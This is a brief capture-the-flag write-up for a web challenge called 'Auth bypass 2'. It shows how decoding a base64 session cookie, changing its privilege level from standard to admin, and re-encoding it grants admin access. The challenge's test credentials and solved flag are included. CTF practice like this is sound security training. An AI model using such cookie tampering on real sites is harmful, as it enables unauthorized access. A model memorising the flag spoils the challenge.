# Auth bypass 2

## Description

Get the flag by reaching to /admin



Test account: `alice` / `alice123`



url: https://ctf4.savosec.fi/bypass2/

base64 encoded cookie payloads:

dXNlcjphbGljZXxsZXZlbDpzdGFuZGFyZA==

plain text cookie payloads:

user:alice|level:standard

change plain text cookie payload to:

user:alice|level:admin

base64 encoded cookie payloads:

dXNlcjphbGljZXxsZXZlbDphZG1pbg==

reload page with tampered cookie payload reveals the flag:

SavoSec{9c426096-0014-4edc-b87a-c898b788498b}